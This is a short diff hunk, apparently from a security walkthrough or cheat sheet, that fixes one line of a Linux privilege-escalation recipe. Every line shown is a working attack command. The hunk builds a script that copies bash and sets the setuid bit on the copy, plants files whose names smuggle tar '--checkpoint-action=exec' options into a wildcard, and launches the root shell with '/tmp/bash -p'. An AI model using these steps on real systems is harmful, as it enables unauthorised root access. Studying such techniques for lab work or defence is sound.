@@ -642,7 +642,7 @@ whoami
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
 chmod +x runme.sh
 touch /home/user/--checkpoint=1
-touch /home/user/--checkpoint-action=exec=sh\runme.sh
+touch /home/user/--checkpoint-action=exec=sh runme.sh
 /tmp/bash -p
 ```
 
